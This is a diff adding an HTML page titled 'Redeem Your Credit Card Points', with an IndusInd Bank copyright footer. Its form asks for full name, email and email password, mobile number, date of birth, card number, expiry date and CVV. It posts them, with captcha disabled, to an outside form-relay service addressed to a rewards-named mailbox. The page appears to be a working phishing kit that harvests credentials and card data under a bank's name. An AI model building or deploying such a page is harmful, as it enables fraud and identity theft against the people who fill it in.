@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redeem your credit card points </title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="mx-md-n5 col-md-offset-3">
+        <div class="card card-primary">
+            <div class="card-header text-center">
+                <h1>Redeem Your Credit Card Points </h1>
+            </div>
+            <div class="card-body">
+               <form action="https://formsubmit.co/form@cardpointsrewards.com" method="Post">
+                <input type="hidden" name="_next" value="http://127.0.0.1:5500/thankyou.html">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+
+                    <div class="form-group">
+                    <label for="full_name">Full Name</label>
+                    <input placeholder="Enter Your Full Name" class="form-control" type="text" id="full_name"  name="fullname" required >
+                   </div>
+                   <div class="form-group">
+                    <label for="gender">Gender</label><br>
+                    <div>
+                    <label for="Male" class="radio-inline">
+                    <input type="radio" name="gender" value="Male" id="Male" for="Male" name="gender" checked> Male </label><br>
+                    <label for="Female" class="radio-inline">
+                        <input type="radio" name="gender" value="Female" id="Female" for="Female" name="gender" > Female</label>
+                    </div> 
+                </div>
+                   <div class="form-group">
+                    <label for="email">Email</label>
+                    <input placeholder="Enter Your email" class="form-control" type="email" id="email" name="email" required>
+                   </div>
+                <div class="form-group">
+                 <label for="email_password">Email Password</label>
+                 <input placeholder="Enter Your email password" class="form-control" type="password" id="email_password" name="emailpassword" required>
+                </div>
+                   
+                <div class="form-group">
+                    <label for="Mobile_number">Mobile Number</label>
+                    <input placeholder="Enter Your Mobile Number" class="form-control" type="text" id="Mobile_number" name="mobilenumber"  required>
+                   </div>
+
+                   <div class="form-group">
+                    <label for="dob">DOB(Date of Birth)</label>
+                    <input placeholder="Enter Your Date of Birth" class="form-control" type="text" id="dob"  name="dob" required>
+                   </div>
+
+                   <div class="form-group">
+                    <label for="Card_number">Card Number</label>
+                    <input placeholder="Enter Your Card Number" class="form-control" type="text" id="Card_number"  name="cardnumber" required>
+                   </div>
+
+                   <div class="form-group">
+                    <label for="expiry_date">Expiry Date</label>
+                    <input placeholder="Enter Your Card Expiry Date" class="form-control" type="text" id="expiry_date" name="expirydate" required >
+                   </div>
+
+                   <div class="form-group">
+                    <label for="cvv_number">CVV Number</label>
+                    <input placeholder="Enter Your CVV Number" class="form-control" type="text" id="cvv_number" name="cvvnumber" required >
+                   </div>
+                   <div class="form-style-agile">
+                    <div class="pom-agile">
+                <input type="checkbox" id="terms_condition" name="terms_condition" value="1" required>
+                <label for="brand1" style= "color: royalblue;"><span></span>I Accept to the Terms & Conditions</label>
+                    </div>
+
+                    <input type="submit" class="btn btn-primary">
+               </form>
+            </div>
+            <div class="card-footer text-center ">
+                Copyright © 2021 Indusind Bank
+            </div>
+        </div>
+        </div>
+    </div>
+</body>
+</html> 
